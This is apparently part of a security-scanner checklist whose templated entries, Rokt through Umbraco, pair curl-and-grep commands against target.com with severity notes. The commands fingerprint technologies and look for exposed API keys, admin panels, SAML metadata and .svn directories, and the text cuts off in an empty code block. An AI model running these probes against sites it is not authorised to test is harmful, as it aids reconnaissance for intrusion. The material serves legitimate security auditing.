<!-- id: rokt | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rokt ecommerce marketing platform.

### Check Rokt for exposed placement ID
<!-- id: rokt-1 | severity: low | tags: rokt, marketing, ecommerce, personalization -->
Rokt placement ID in page source reveals the marketing account and campaign configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "rokt\|rokt\.com"
```

**References:**
- https://rokt.com/security

---

## Rollbar
<!-- id: rollbar | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rollbar error monitoring platform.

### Check Rollbar for exposed access token
<!-- id: rollbar-1 | severity: high | tags: rollbar, error-monitoring, javascript, logging -->
Rollbar client-side access token in source code allows unauthorized error log submission and data exfiltration.

**Commands:**
```bash
curl -s http://target.com | grep -i "rollbar\|rollbar\.accessToken"
```

**References:**
- https://rollbar.com/security

---

## RomanCart
<!-- id: romancart | icon: 🛠️ | color: #e06c75 -->
Security checklists for RomanCart ecommerce platform.

### Check RomanCart for exposed store ID
<!-- id: romancart-1 | severity: low | tags: romancart, ecommerce, shopping-cart, store -->
RomanCart store ID in page source reveals the merchant account and shopping cart configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "romancart"
```

**References:**
- https://www.romancart.com/security

---

## Route
<!-- id: route | icon: 🛠️ | color: #e06c75 -->
Security checklists for Route package tracking platform.

### Check Route for exposed API key
<!-- id: route-1 | severity: medium | tags: route, tracking, shipping, ecommerce -->
Route API keys in client-side code may allow unauthorized package tracking and order data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "route\.com\|routeapp\|route_id"
```

**References:**
- https://route.com/security

---

## Royal Mail
<!-- id: royal-mail | icon: 🛠️ | color: #e06c75 -->
Security checklists for Royal Mail shipping and tracking.

### Check Royal Mail for exposed tracking data
<!-- id: royal-mail-1 | severity: low | tags: royalmail, shipping, tracking, uk -->
Royal Mail tracking numbers in page source may leak customer order details and shipping addresses.

**Commands:**
```bash
curl -s http://target.com | grep -i "royalmail\|royal-mail\|royal\.mail"
```

**References:**
- https://www.royalmail.com/security

---

## Rspack
<!-- id: rspack | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rspack Rust-based bundler.

### Check Rspack for version exposure
<!-- id: rspack-1 | severity: low | tags: rspack, bundler, rust, javascript -->
Rspack version identifiers in build output may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "rspack\|@rspack"
```

**References:**
- https://rspack.dev/security

---

## Rspress
<!-- id: rspress | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rspress static site generator.

### Check Rspress for exposed config
<!-- id: rspress-1 | severity: low | tags: rspress, documentation, static-site, rspack -->
Rspress configuration files may leak internal documentation structure and build configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "rspress"
```

**References:**
- https://rspress.dev/security

---

## Rudderstack
<!-- id: rudderstack | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rudderstack customer data platform.

### Check Rudderstack for exposed write key
<!-- id: rudderstack-1 | severity: high | tags: rudderstack, cdp, analytics, data-pipeline -->
Rudderstack write key in client-side code allows unauthorized event submission and potential data injection.

**Commands:**
```bash
curl -s http://target.com | grep -i "rudderstack\|rudderanalytics"
```

**References:**
- https://www.rudderstack.com/security

---

## Ruffle
<!-- id: ruffle | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ruffle Flash emulator.

### Check Ruffle for version exposure
<!-- id: ruffle-1 | severity: low | tags: ruffle, flash, emulator, wasm -->
Ruffle version identifiers in WASM files may reveal outdated versions with known emulation vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "ruffle\|ruffle\.js\|ruffle\.wasm"
```

**References:**
- https://ruffle.rs/security

---

## Rumble
<!-- id: rumble | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rumble video platform.

### Check Rumble for embedded video config
<!-- id: rumble-1 | severity: low | tags: rumble, video, embed, streaming -->
Rumble embedded video configurations may leak video IDs and channel metadata.

**Commands:**
```bash
curl -s http://target.com | grep -i "rumble\|rumble\.com"
```

**References:**
- https://rumble.com/security

---

## RunKit
<!-- id: runkit | icon: 🛠️ | color: #e06c75 -->
Security checklists for RunKit Node.js playground.

### Check RunKit for exposed notebook data
<!-- id: runkit-1 | severity: low | tags: runkit, nodejs, playground, notebook -->
RunKit embedded notebooks may reveal API keys, endpoints, and internal code examples.

**Commands:**
```bash
curl -s http://target.com | grep -i "runkit\|runkit\.com"
```

**References:**
- https://runkit.com/security

---

## Rust
<!-- id: rust | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rust programming language.

### Check Rust for exposed Cargo registry
<!-- id: rust-1 | severity: medium | tags: rust, programming-language, cargo, wasm -->
Rust WASM binaries and Cargo.toml files may reveal dependency versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "cargo\|rust\.wasm\|\.wasm"
```

**References:**
- https://www.rust-lang.org/security

---

## RxJS
<!-- id: rxjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for RxJS reactive programming library.

### Check RxJS for version exposure
<!-- id: rxjs-1 | severity: low | tags: rxjs, reactive, javascript, observables -->
RxJS version identifiers in JS bundles may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "rxjs\|observable\|Subject"
```

**References:**
- https://rxjs.dev/security

---

## Shopware
<!-- id: shopware | icon: 🛠️ | color: #e06c75 -->
Security checklists for Shopware ecommerce platform.

### Check Shopware for exposed admin panel
<!-- id: shopware-1 | severity: high | tags: shopware, ecommerce, cms, german -->
Shopware admin panel exposed without rate limiting allows brute-force attacks and store configuration compromise.

**Commands:**
```bash
curl -s http://target.com/backend | grep -i "shopware\|sw-admin"
```

**References:**
- https://www.shopware.com/security/

---

## Signal
<!-- id: signal | icon: 🛠️ | color: #e06c75 -->
Security checklists for Signal messaging platform.

### Check Signal for exposed API endpoint
<!-- id: signal-1 | severity: medium | tags: signal, messaging, encryption, privacy -->
Signal API endpoints and CDN URLs may reveal server configuration and rate-limiting behavior.

**Commands:**
```bash
curl -s http://target.com | grep -i "signal\|signal\.org\|whispersystems"
```

**References:**
- https://signal.org/security/

---

## SignalR
<!-- id: signalr | icon: 🛠️ | color: #e06c75 -->
Security checklists for SignalR real-time communication library.

### Check SignalR for exposed negotiate endpoint
<!-- id: signalr-1 | severity: medium | tags: signalr, aspnet, websocket, realtime -->
SignalR negotiate endpoint may leak connection information, transport protocols, and server capabilities.

**Commands:**
```bash
curl -s http://target.com/signalr/negotiate
```

**References:**
- https://learn.microsoft.com/en-us/aspnet/signalr/security

---

## Silverstripe
<!-- id: silverstripe | icon: 🛠️ | color: #e06c75 -->
Security checklists for Silverstripe CMS.

### Check Silverstripe for version exposure
<!-- id: silverstripe-1 | severity: medium | tags: silverstripe, cms, php, framework -->
Silverstripe version identifiers in page source may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "silverstripe\|SilverStripe"
```

**References:**
- https://www.silverstripe.org/security/

---

## Simple Machines Forum
<!-- id: simple-machines-forum | icon: 🛠️ | color: #e06c75 -->
Security checklists for Simple Machines Forum (SMF).

### Check SMF for version exposure
<!-- id: simple-machines-forum-1 | severity: medium | tags: smf, forum, php, community -->
SMF version identifiers in page source may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "simple machines\|SMF\|smf_[0-9]"
```

**References:**
- https://www.simplemachines.org/security/

---

## SimpleSAMLphp
<!-- id: simplesamlphp | icon: 🛠️ | color: #e06c75 -->
Security checklists for SimpleSAMLphp authentication library.

### Check SimpleSAMLphp for exposed metadata
<!-- id: simplesamlphp-1 | severity: high | tags: simplesamlphp, saml, sso, authentication -->
SimpleSAMLphp metadata endpoints may leak SAML certificates, entity IDs, and SSO configuration.

**Commands:**
```bash
curl -s http://target.com/simplesaml/module.php/saml/sp/metadata.php
```

**References:**
- https://simplesamlphp.org/security

---

## Sinatra
<!-- id: sinatra | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sinatra Ruby web framework.

### Check Sinatra for exposed session secret
<!-- id: sinatra-1 | severity: high | tags: sinatra, ruby, framework, web -->
Sinatra session cookies signed with weak or default secret keys allow session forgery and privilege escalation.

**Commands:**
```bash
curl -sI http://target.com | grep -i "sinatra\|session"
```

**References:**
- https://sinatrarb.com/security/

---

## SiteGround
<!-- id: siteground | icon: 🛠️ | color: #e06c75 -->
Security checklists for SiteGround hosting platform.

### Check SiteGround for exposed hosting info
<!-- id: siteground-1 | severity: low | tags: siteground, hosting, wordpress, managed -->
SiteGround-specific headers and URLs may reveal the hosting provider and server configuration.

**Commands:**
```bash
curl -sI http://target.com | grep -i "siteground\|sg"
```

**References:**
- https://www.siteground.com/security/

---

## Socket.io
<!-- id: socketio | icon: 🛠️ | color: #e06c75 -->
Security checklists for Socket.io real-time library.

### Check Socket.io for exposed endpoint
<!-- id: socketio-1 | severity: medium | tags: socketio, websocket, realtime, nodejs -->
Socket.io endpoint exposed allows unauthorized event emission and potential cross-origin WebSocket attacks.

**Commands:**
```bash
curl -s http://target.com/socket.io/
```

**References:**
- https://socket.io/docs/security/

---

## SolidJS
<!-- id: solidjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for SolidJS JavaScript framework.

### Check SolidJS for development mode exposure
<!-- id: solidjs-1 | severity: low | tags: solidjs, javascript, framework, reactive -->
SolidJS development mode identifiers in production builds may reveal component structure and source maps.

**Commands:**
```bash
curl -s http://target.com | grep -i "solidjs\|solid-js\|_\$SOLID"
```

**References:**
- https://www.solidjs.com/security

---

## SoundCloud
<!-- id: soundcloud | icon: 🛠️ | color: #e06c75 -->
Security checklists for SoundCloud audio platform.

### Check SoundCloud for exposed embed data
<!-- id: soundcloud-1 | severity: low | tags: soundcloud, audio, embed, widget -->
SoundCloud embedded widgets may leak track IDs, user profiles, and playlist data.

**Commands:**
```bash
curl -s http://target.com | grep -i "soundcloud\|soundcloud\.com"
```

**References:**
- https://soundcloud.com/security

---

## Sphinx
<!-- id: sphinx | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sphinx search engine.

### Check Sphinx for exposed search endpoint
<!-- id: sphinx-1 | severity: medium | tags: sphinx, search, fulltext, database -->
Sphinx search API endpoint exposed may allow unauthorized queries and data extraction from indexed content.

**Commands:**
```bash
curl -s http://target.com | grep -i "sphinx\|searchd"
```

**References:**
- https://sphinxsearch.com/security/

---

## Spline
<!-- id: spline | icon: 🛠️ | color: #e06c75 -->
Security checklists for Spline 3D design tool.

### Check Spline for exposed scene data
<!-- id: spline-1 | severity: low | tags: spline, 3d, design, webgl -->
Spline embedded scenes may leak 3D model data, scene configuration, and interaction logic.

**Commands:**
```bash
curl -s http://target.com | grep -i "spline\.app\|spline\.js"
```

**References:**
- https://spline.design/security

---

## Spotify
<!-- id: spotify | icon: 🛠️ | color: #e06c75 -->
Security checklists for Spotify music platform.

### Check Spotify for exposed API credentials
<!-- id: spotify-1 | severity: high | tags: spotify, music, api, oauth -->
Spotify API client IDs and redirect URIs in client-side code may allow OAuth token interception.

**Commands:**
```bash
curl -s http://target.com | grep -i "spotify\|spotify\.com\|open\.spotify"
```

**References:**
- https://developer.spotify.com/security

---

## Spree
<!-- id: spree | icon: 🛠️ | color: #e06c75 -->
Security checklists for Spree ecommerce platform.

### Check Spree for exposed admin panel
<!-- id: spree-1 | severity: high | tags: spree, ecommerce, ruby, rails -->
Spree admin panel exposed without authentication allows product manipulation and customer data access.

**Commands:**
```bash
curl -s http://target.com/admin | grep -i "spree"
```

**References:**
- https://spreecommerce.org/security/

---

## Square
<!-- id: square | icon: 🛠️ | color: #e06c75 -->
Security checklists for Square payments platform.

### Check Square for exposed application ID
<!-- id: square-1 | severity: medium | tags: square, payments, pos, ecommerce -->
Square application ID in client-side code reveals the merchant account and payment form configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "square\|square\.com\|sqpayment"
```

**References:**
- https://squareup.com/security

---

## Squarespace
<!-- id: squarespace | icon: 🛠️ | color: #e06c75 -->
Security checklists for Squarespace website builder.

### Check Squarespace for exposed site ID
<!-- id: squarespace-1 | severity: low | tags: squarespace, website-builder, cms, hosting -->
Squarespace site ID and template identifiers in page source may reveal the site configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "squarespace\|static\.squarespace"
```

**References:**
- https://www.squarespace.com/security/

---

## Statamic
<!-- id: statamic | icon: 🛠️ | color: #e06c75 -->
Security checklists for Statamic flat-file CMS.

### Check Statamic for exposed CP panel
<!-- id: statamic-1 | severity: medium | tags: statamic, cms, flat-file, laravel -->
Statamic control panel exposed without authentication allows site configuration modification.

**Commands:**
```bash
curl -s http://target.com/cp
```

**References:**
- https://statamic.com/security

---

## Statcounter
<!-- id: statcounter | icon: 🛠️ | color: #e06c75 -->
Security checklists for Statcounter analytics platform.

### Check Statcounter for exposed project ID
<!-- id: statcounter-1 | severity: low | tags: statcounter, analytics, tracking, widget -->
Statcounter project ID in page source reveals the analytics account and tracking configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "statcounter\|statcounter\.com"
```

**References:**
- https://statcounter.com/security

---

## Stimulus
<!-- id: stimulus | icon: 🛠️ | color: #e06c75 -->
Security checklists for Stimulus JavaScript framework.

### Check Stimulus for exposed controller data
<!-- id: stimulus-1 | severity: low | tags: stimulus, javascript, framework, hotwire -->
Stimulus controller names and attribute values in HTML may reveal application logic and data bindings.

**Commands:**
```bash
curl -s http://target.com | grep -i "data-controller\|data-action\|stimulus"
```

**References:**
- https://stimulus.hotwired.dev/security

---

## Storyblok
<!-- id: storyblok | icon: 🛠️ | color: #e06c75 -->
Security checklists for Storyblok headless CMS.

### Check Storyblok for exposed public token
<!-- id: storyblok-1 | severity: low | tags: storyblok, headless-cms, cms, api -->
Storyblok public access token in page source reveals the content space and API configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "storyblok\|app\.storyblok"
```

**References:**
- https://www.storyblok.com/security

---

## Storybook
<!-- id: storybook | icon: 🛠️ | color: #e06c75 -->
Security checklists for Storybook UI component explorer.

### Check Storybook for exposed storybook instance
<!-- id: storybook-1 | severity: medium | tags: storybook, ui, components, development -->
Storybook instance deployed to production reveals component source code, props, and internal documentation.

**Commands:**
```bash
curl -s http://target.com/storybook | grep -i "storybook\|sb-addon"
```

**References:**
- https://storybook.js.org/security

---

## Streamlit
<!-- id: streamlit | icon: 🛠️ | color: #e06c75 -->
Security checklists for Streamlit Python app framework.

### Check Streamlit for exposed app config
<!-- id: streamlit-1 | severity: medium | tags: streamlit, python, data-science, dashboard -->
Streamlit app configuration exposed may reveal API endpoints, data sources, and internal logic.

**Commands:**
```bash
curl -s http://target.com | grep -i "streamlit"
```

**References:**
- https://streamlit.io/security

---

## Stripe
<!-- id: stripe | icon: 🛠️ | color: #e06c75 -->
Security checklists for Stripe payments platform.

### Check Stripe for exposed publishable key
<!-- id: stripe-1 | severity: medium | tags: stripe, payments, api-key, ecommerce -->
Stripe publishable key in client-side code identifies the Stripe account and may enable payment method enumeration.

**Commands:**
```bash
curl -s http://target.com | grep -i "stripe\|pk_live\|pk_test\|stripe\.js"
```

**References:**
- https://stripe.com/docs/security

---

## Substack
<!-- id: substack | icon: 🛠️ | color: #e06c75 -->
Security checklists for Substack newsletter platform.

### Check Substack for exposed embed data
<!-- id: substack-1 | severity: low | tags: substack, newsletter, publishing, subscription -->
Substack embedded subscription forms may leak publication IDs, subscriber counts, and revenue data.

**Commands:**
```bash
curl -s http://target.com | grep -i "substack\|substack\.com\|substackcdn"
```

**References:**
- https://substack.com/security

---

## Subversion
<!-- id: subversion | icon: 🛠️ | color: #e06c75 -->
Security checklists for Subversion (SVN) version control.

### Check Subversion for exposed SVN metadata
<!-- id: subversion-1 | severity: high | tags: subversion, svn, vcs, source-control -->
Subversion .svn directories exposed leak entire source code, commit history, and credentials.

**Commands:**
```bash
curl -s http://target.com/.svn/entries
```

**References:**
- https://subversion.apache.org/security/

---

## Sucuri
<!-- id: sucuri | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sucuri website security platform.

### Check Sucuri for exposed WAF headers
<!-- id: sucuri-1 | severity: low | tags: sucuri, waf, security, firewall -->
Sucuri WAF headers and cookies reveal the security provider and may indicate bypassable rules.

**Commands:**
```bash
curl -sI http://target.com | grep -i "sucuri\|cloudproxy"
```

**References:**
- https://sucuri.net/security

---

## Supabase
<!-- id: supabase | icon: 🛠️ | color: #e06c75 -->
Security checklists for Supabase backend platform.

### Check Supabase for exposed anon key
<!-- id: supabase-1 | severity: medium | tags: supabase, backend, database, realtime -->
Supabase anon/public key in client-side code identifies the project and may allow unauthorized database queries if RLS is misconfigured.

**Commands:**
```bash
curl -s http://target.com | grep -i "supabase\|supabase\.co"
```

**References:**
- https://supabase.com/security

---

## Svelte
<!-- id: svelte | icon: 🛠️ | color: #e06c75 -->
Security checklists for Svelte JavaScript framework.

### Check Svelte for development mode exposure
<!-- id: svelte-1 | severity: low | tags: svelte, javascript, framework, compiler -->
Svelte development mode identifiers in production builds may reveal component structure and source maps.

**Commands:**
```bash
curl -s http://target.com | grep -i "svelte\|__svelte"
```

**References:**
- https://svelte.dev/security

---

## SvelteKit
<!-- id: sveltekit | icon: 🛠️ | color: #e06c75 -->
Security checklists for SvelteKit full-stack framework.

### Check SvelteKit for exposed server data
<!-- id: sveltekit-1 | severity: high | tags: sveltekit, svelte, framework, ssr -->
SvelteKit server-side load functions may leak API endpoints, secrets, and internal route structures.

**Commands:**
```bash
curl -s http://target.com | grep -i "sveltekit\|__data\.json"
```

**References:**
- https://kit.svelte.dev/security

---

## Swiper
<!-- id: swiper | icon: 🛠️ | color: #e06c75 -->
Security checklists for Swiper touch slider library.

### Check Swiper for version exposure
<!-- id: swiper-1 | severity: low | tags: swiper, slider, javascript, touch -->
Swiper version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "swiper\|swiper-bundle"
```

**References:**
- https://swiperjs.com/security

---

## Tableau
<!-- id: tableau | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tableau data visualization platform.

### Check Tableau for exposed views
<!-- id: tableau-1 | severity: medium | tags: tableau, analytics, visualization, bi -->
Tableau views exposed without authentication may leak internal business data and dashboards.

**Commands:**
```bash
curl -s http://target.com/views | grep -i "tableau\|tableau\.js"
```

**References:**
- https://www.tableau.com/security

---

## Taboola
<!-- id: taboola | icon: 🛠️ | color: #e06c75 -->
Security checklists for Taboola content discovery platform.

### Check Taboola for exposed publisher ID
<!-- id: taboola-1 | severity: low | tags: taboola, advertising, content, recommendations -->
Taboola publisher ID in page source reveals the advertising account and content recommendation configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "taboola"
```

**References:**
- https://www.taboola.com/security

---

## Tailwind CSS
<!-- id: tailwind-css | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tailwind CSS framework.

### Check Tailwind CSS for version exposure
<!-- id: tailwind-css-1 | severity: low | tags: tailwind, css, framework, utility -->
Tailwind CSS version identifiers in stylesheets may reveal outdated versions with known issues.

**Commands:**
```bash
curl -s http://target.com | grep -i "tailwindcss\|tailwind"
```

**References:**
- https://tailwindcss.com/security

---

## Tawk.to
<!-- id: tawkto | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tawk.to live chat platform.

### Check Tawk.to for exposed widget ID
<!-- id: tawkto-1 | severity: low | tags: tawkto, live-chat, customer-support, widget -->
Tawk.to widget ID in page source reveals the chat account and visitor tracking configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "tawk\|tawk\.to"
```

**References:**
- https://www.tawk.to/security/

---

## Teachable
<!-- id: teachable | icon: 🛠️ | color: #e06c75 -->
Security checklists for Teachable online course platform.

### Check Teachable for exposed school data
<!-- id: teachable-1 | severity: low | tags: teachable, courses, education, lms -->
Teachable school identifiers in page source may leak course enrollment data and pricing information.

**Commands:**
```bash
curl -s http://target.com | grep -i "teachable\|teachable\.com"
```

**References:**
- https://teachable.com/security

---

## TeamViewer
<!-- id: teamviewer | icon: 🛠️ | color: #e06c75 -->
Security checklists for TeamViewer remote desktop platform.

### Check TeamViewer for exposed API endpoint
<!-- id: teamviewer-1 | severity: low | tags: teamviewer, remote-desktop, support, iot -->
TeamViewer API endpoints and partner integration scripts may reveal remote access configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "teamviewer"
```

**References:**
- https://www.teamviewer.com/security/

---

## Tencent Cloud
<!-- id: tencent-cloud | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tencent Cloud platform.

### Check Tencent Cloud for exposed CDN config
<!-- id: tencent-cloud-1 | severity: low | tags: tencent, cloud, cdn, china -->
Tencent Cloud CDN URLs and resource identifiers may reveal the cloud account and service configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "tencent\|qcloud\|myqcloud"
```

**References:**
- https://www.tencentcloud.com/security/

---

## ThinkPHP
<!-- id: thinkphp | icon: 🛠️ | color: #e06c75 -->
Security checklists for ThinkPHP framework.

### Check ThinkPHP for version exposure
<!-- id: thinkphp-1 | severity: high | tags: thinkphp, php, framework, china -->
ThinkPHP version identifiers reveal outdated versions with known RCE and deserialization vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "thinkphp"
```

**References:**
- https://www.thinkphp.cn/security

---

## Thinkific
<!-- id: thinkific | icon: 🛠️ | color: #e06c75 -->
Security checklists for Thinkific online course platform.

### Check Thinkific for exposed school data
<!-- id: thinkific-1 | severity: low | tags: thinkific, courses, education, lms -->
Thinkific school identifiers in page source may reveal course content and student enrollment data.

**Commands:**
```bash
curl -s http://target.com | grep -i "thinkific"
```

**References:**
- https://www.thinkific.com/security/

---

## Three.js
<!-- id: threejs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Three.js 3D library.

### Check Three.js for version exposure
<!-- id: threejs-1 | severity: low | tags: threejs, 3d, webgl, javascript -->
Three.js version identifiers in JS bundles may reveal outdated versions with known WebGL vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "three\.js\|three\.min"
```

**References:**
- https://threejs.org/security

---

## ThriveCart
<!-- id: thrivecart | icon: 🛠️ | color: #e06c75 -->
Security checklists for ThriveCart checkout platform.

### Check ThriveCart for exposed API key
<!-- id: thrivecart-1 | severity: medium | tags: thrivecart, checkout, ecommerce, payments -->
ThriveCart API keys in client-side code may allow unauthorized access to order data and customer information.

**Commands:**
```bash
curl -s http://target.com | grep -i "thrivecart"
```

**References:**
- https://thrivecart.com/security/

---

## TiddlyWiki
<!-- id: tiddlywiki | icon: 🛠️ | color: #e06c75 -->
Security checklists for TiddlyWiki personal wiki.

### Check TiddlyWiki for exposed content
<!-- id: tiddlywiki-1 | severity: medium | tags: tiddlywiki, wiki, knowledge-base, javascript -->
TiddlyWiki files served as static HTML may expose sensitive internal documentation and passwords.

**Commands:**
```bash
curl -s http://target.com | grep -i "tiddlywiki\|tiddler"
```

**References:**
- https://tiddlywiki.com/security

---

## Tidio
<!-- id: tidio | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tidio live chat platform.

### Check Tidio for exposed API key
<!-- id: tidio-1 | severity: low | tags: tidio, live-chat, chatbot, customer-support -->
Tidio API keys in page source may allow unauthorized access to chat conversations and visitor data.

**Commands:**
```bash
curl -s http://target.com | grep -i "tidio\|tidiochat"
```

**References:**
- https://www.tidio.com/security/

---

## TikTok Pixel
<!-- id: tiktok-pixel | icon: 🛠️ | color: #e06c75 -->
Security checklists for TikTok Pixel advertising platform.

### Check TikTok Pixel for exposed pixel ID
<!-- id: tiktok-pixel-1 | severity: low | tags: tiktok, pixel, advertising, tracking -->
TikTok Pixel ID in page source reveals the advertising account and event tracking configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "tiktok\|ttq\|pixel"
```

**References:**
- https://ads.tiktok.com/security/

---

## Tilda
<!-- id: tilda | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tilda landing page builder.

### Check Tilda for exposed project ID
<!-- id: tilda-1 | severity: low | tags: tilda, landing-page, website-builder, no-code -->
Tilda project identifiers in page source may reveal the site configuration and editor metadata.

**Commands:**
```bash
curl -s http://target.com | grep -i "tilda\|tilda\.ws"
```

**References:**
- https://tilda.cc/security/

---

## TinyMCE
<!-- id: tinymce | icon: 🛠️ | color: #e06c75 -->
Security checklists for TinyMCE rich text editor.

### Check TinyMCE for version exposure
<!-- id: tinymce-1 | severity: low | tags: tinymce, editor, wysiwyg, javascript -->
TinyMCE version identifiers in JS files may reveal outdated versions with known XSS vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "tinymce\|tiny_mce"
```

**References:**
- https://www.tiny.cloud/security/

---

## Tiptap
<!-- id: tiptap | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tiptap rich text editor.

### Check Tiptap for version exposure
<!-- id: tiptap-1 | severity: low | tags: tiptap, editor, prose, javascript -->
Tiptap version identifiers in JS bundles may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "tiptap\|@tiptap"
```

**References:**
- https://tiptap.dev/security

---

## TradingView
<!-- id: tradingview | icon: 🛠️ | color: #e06c75 -->
Security checklists for TradingView financial charts.

### Check TradingView for exposed widget data
<!-- id: tradingview-1 | severity: low | tags: tradingview, charts, finance, stocks -->
TradingView embedded charts may leak ticker symbols, market data, and trading strategy configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "tradingview\|tradingview\.com"
```

**References:**
- https://www.tradingview.com/security/

---

## Trustpilot
<!-- id: trustpilot | icon: 🛠️ | color: #e06c75 -->
Security checklists for Trustpilot review platform.

### Check Trustpilot for exposed business ID
<!-- id: trustpilot-1 | severity: low | tags: trustpilot, reviews, widgets, ecommerce -->
Trustpilot business unit ID in page source reveals the review account and collection configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "trustpilot\|trustpilot\.com"
```

**References:**
- https://www.trustpilot.com/security/

---

## Tumblr
<!-- id: tumblr | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tumblr blogging platform.

### Check Tumblr for exposed embed data
<!-- id: tumblr-1 | severity: low | tags: tumblr, blogging, social, embed -->
Tumblr embedded content may leak blog metadata, theme configuration, and post data.

**Commands:**
```bash
curl -s http://target.com | grep -i "tumblr\|tumblr\.com"
```

**References:**
- https://www.tumblr.com/security/

---

## Turbolinks
<!-- id: turbolinks | icon: 🛠️ | color: #e06c75 -->
Security checklists for Turbolinks navigation library.

### Check Turbolinks for version exposure
<!-- id: turbolinks-1 | severity: low | tags: turbolinks, javascript, navigation, rails -->
Turbolinks version identifiers in JS bundles may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "turbolinks\|turbolinks\.js"
```

**References:**
- https://github.com/turbolinks/turbolinks/security

---

## Twilio
<!-- id: twilio | icon: 🛠️ | color: #e06c75 -->
Security checklists for Twilio communications API.

### Check Twilio for exposed account SID
<!-- id: twilio-1 | severity: high | tags: twilio, sms, voice, api, communications -->
Twilio Account SID and Auth Token in client-side code allow unauthorized SMS sending and call logging.

**Commands:**
```bash
curl -s http://target.com | grep -i "twilio\|AC[0-9a-f]\{32\}"
```

**References:**
- https://www.twilio.com/security/

---

## Twitch
<!-- id: twitch | icon: 🛠️ | color: #e06c75 -->
Security checklists for Twitch streaming platform.

### Check Twitch for exposed client ID
<!-- id: twitch-1 | severity: low | tags: twitch, streaming, embed, api -->
Twitch client ID in embedded streams may reveal the application and channel configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "twitch\|twitch\.tv\|clips\.twitch"
```

**References:**
- https://www.twitch.tv/security/

---

## Twitter
<!-- id: twitter | icon: 🛠️ | color: #e06c75 -->
Security checklists for Twitter social platform.

### Check Twitter for exposed embed data
<!-- id: twitter-1 | severity: low | tags: twitter, social, embed, widget -->
Twitter embedded timelines and tweet widgets may leak account metadata and interaction data.

**Commands:**
```bash
curl -s http://target.com | grep -i "twitter\|platform\.twitter\|twttr"
```

**References:**
- https://twitter.com/security

---

## TypeScript
<!-- id: typescript | icon: 🛠️ | color: #e06c75 -->
Security checklists for TypeScript programming language.

### Check TypeScript for exposed source maps
<!-- id: typescript-1 | severity: medium | tags: typescript, javascript, programming-language, compiler -->
TypeScript source maps in production expose original source code, comments, and internal logic.

**Commands:**
```bash
curl -s http://target.com | grep -i "\.ts\|sourceMappingURL"
```

**References:**
- https://www.typescriptlang.org/security/

---

## Typeform
<!-- id: typeform | icon: 🛠️ | color: #e06c75 -->
Security checklists for Typeform form builder.

### Check Typeform for exposed form ID
<!-- id: typeform-1 | severity: low | tags: typeform, forms, survey, embed -->
Typeform embed IDs in page source may reveal form structure and response collection configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "typeform\|typeform\.com"
```

**References:**
- https://www.typeform.com/security/

---

## Typesense
<!-- id: typesense | icon: 🛠️ | color: #e06c75 -->
Security checklists for Typesense search engine.

### Check Typesense for exposed API key
<!-- id: typesense-1 | severity: high | tags: typesense, search, fulltext, api-key -->
Typesense API keys in client-side code allow unauthorized search queries and data extraction from indexed collections.

**Commands:**
```bash
curl -s http://target.com | grep -i "typesense"
```

**References:**
- https://typesense.org/security/

---

## Ubuntu
<!-- id: ubuntu | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ubuntu Linux distribution.

### Check Ubuntu for server header disclosure
<!-- id: ubuntu-1 | severity: low | tags: ubuntu, linux, server, os -->
Ubuntu server headers reveal the operating system version for targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "ubuntu"
```

**References:**
- https://ubuntu.com/security

---

## Umbraco
<!-- id: umbraco | icon: 🛠️ | color: #e06c75 -->
Security checklists for Umbraco CMS.

### Check Umbraco for exposed admin panel
<!-- id: umbraco-1 | severity: high | tags: umbraco, cms, dotnet, content-management -->
Umbraco admin panel exposed allows unauthorized content modification and user account enumeration.

**Commands:**
```bash
